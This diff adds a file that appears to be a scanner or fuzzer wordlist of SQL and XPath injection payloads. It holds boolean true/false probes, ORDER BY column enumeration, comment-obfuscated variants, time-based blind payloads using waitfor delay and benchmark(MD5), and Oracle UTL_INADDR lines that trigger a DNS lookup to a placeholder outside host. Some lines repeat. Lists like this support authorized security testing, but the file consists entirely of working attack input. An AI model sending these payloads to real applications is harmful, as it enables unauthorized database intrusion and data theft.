@@ -1,0 +1,86 @@
+2 and 456=678
+2 or 345=345
+2 order by 9999
+2 order by 1
+2/0 and 456=678
+2/1 or 345=345
+2/*f*/and/*f*/456=678
+2/*f*/or/*f*/345=345
+a' and '456'='678
+a' or '345'='345
+a' and 'fghi'='fghj'-- #
+a' or 'dfth'='dfth'-- #
+a' order by 9999-- #
+a' order by 1-- #
+a'and/*g*/456=678-- #
+a'or/*g*/345=345-- #
+a' and '456'='678
+a' or '345'='345
+a' and 'fghi'='fghj'#
+a' or 'dfth'='dfth'#
+a' order by 9999#
+a' order by 1#
+a'||/**/456=678#
+a'||/**/345=345#
+a' and '456'='678
+a' or '345'='345
+a' and 'fghi'='fghj'--
+a' or 'dfth'='dfth'--
+a' order by 9999--
+a' order by 1--
+a'and/*d*/456=678--
+a'or/*d*/345=345--
+a' and '456'='678
+a' or '345'='345
+a' and 'fghi'='fghj'-- #
+a' or 'dfth'='dfth'-- #
+a' order by 9999-- #
+a' order by 1-- #
+a'and/*g*/456=678-- #
+a'or/*g*/345=345-- #
+345'%5d|//*|/a%5b'a
+456'%5d|//a|/a%5b'a
+345')%5d|//*|/a%5bcontains(a,'b
+456')%5d|//a|/a%5bcontains(a,'b
+a" and "456"="678
+a" or "345"="345
+a" and "fghi"="fghj"-- #
+a" or "dfth"="dfth"-- #
+a" order by 9999-- #
+a" order by 1-- #
+a"and/*g*/456=678-- #
+a"or/*g*/345=345-- #
+345"%5d|//*|/a%5b"a
+456"%5d|//a|/a%5b"a
+345")%5d|//*|/a%5bcontains(a,"b
+456")%5d|//a|/a%5bcontains(a,"b
+1 waitfor delay '0:0:X'--
+1; waitfor delay '0:0:X'--
+1'; waitfor delay '0:0:X'--
+1); waitfor delay '0:0:X'--
+1)); waitfor delay '0:0:X'--
+1'); waitfor delay '0:0:X'--
+1')); waitfor delay '0:0:X'--
+1 or benchmark(100000000,MD5(1))#
+1' or benchmark(100000000,MD5(1))#
+1) or benchmark(100000000,MD5(1))#
+1') or benchmark(100000000,MD5(1))#
+1)) or benchmark(100000000,MD5(1))#
+1')) or benchmark(100000000,MD5(1))#
+1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--
+1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--
+1 waitfor delay '0:0:X'--
+1; waitfor delay '0:0:X'--
+1'; waitfor delay '0:0:X'--
+1); waitfor delay '0:0:X'--
+1)); waitfor delay '0:0:X'--
+1'); waitfor delay '0:0:X'--
+1')); waitfor delay '0:0:X'--
+1 or benchmark(100000000,MD5(1))#
+1' or benchmark(100000000,MD5(1))#
+1) or benchmark(100000000,MD5(1))#
+1') or benchmark(100000000,MD5(1))#
+1)) or benchmark(100000000,MD5(1))#
+1')) or benchmark(100000000,MD5(1))#
+1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--
+1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--
